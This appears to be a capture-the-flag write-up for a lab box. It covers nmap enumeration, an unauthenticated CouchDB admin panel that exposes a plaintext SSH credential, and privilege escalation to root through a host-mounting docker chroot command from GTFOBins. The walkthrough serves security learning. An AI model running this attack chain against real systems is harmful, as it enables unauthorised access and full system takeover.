This is a easy box with half guided, let's dig in
# Eumeration
## Scanning
Let's start by a normal scan by nmap
```
nmap -p- -v <ip>

...
Discovered open port 22/tcp on 10.10.253.5
...
Discovered open port 5984/tcp on 10.10.253.5
...
```
Now we know there are 2 port is now opened and that is the answer for question 1 (2) and question 3 (5984).
Now start scanning for what service is running on thesse 2 boxes
```
nmap -A -p 22,5984 10.10.253.5
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
```

Now we has know 2 information:
- SSH service is running on port 22
- CouchDB is running on port 5984
## Information Gathering
Let's access to browser on port 5984 and see what we can find
```
curl http://10.10.253.5:5984/
{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
```
We get the reponse from the server. So we got the version of the CouchDB, as well as the answer for question 4.
At this state, you can use `gobuster` to brute force the directory but it is not a good idea. Another option is we can go on the internet and find and well-organized documentation for CouchDB here:
`https://docs.couchdb.org/en/stable/intro/tour.html`
Here, we can find interesting url:
- `\_all_dbs`: it will return list of all databases
- `\_utils`: allow us to access the interface for the admin

I will try `\_utils` first
![alt text](assets/img/tryhackme/couchDB/browser.png)
And now we find out there are a juicy database name `secret`, lets try to access it and ... booyah
`passwordbackup   atena:t4qfzcc4qN##`
We find out a credential and I guess that is the credential for the SSH
## Exploit
I try to access SSH with our gathered credential
`ssh atena@<ip>`
And now we are the user `atena`. Lets find the way to root
First I try find the sudo right of `atena` user
```
atena@ubuntu:~$ sudo -l
[sudo] password for atena: 
Sorry, user atena may not run sudo on ubuntu.
```
So atena don't have any sudo right, let find another way. After a while, I find interesting information in `.bash_history`
```
cat ~/.bash_history
...
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
...
```
So that mean atean can access to docker on port 2375. I search docker on `GTFObin` and found out that we can spawn root shell using that command [here](https://gtfobins.github.io/gtfobins/docker/): 
`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
Let's try that on our command:
```
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
THM{####################}
```
And we got to root.

Thanks for reading
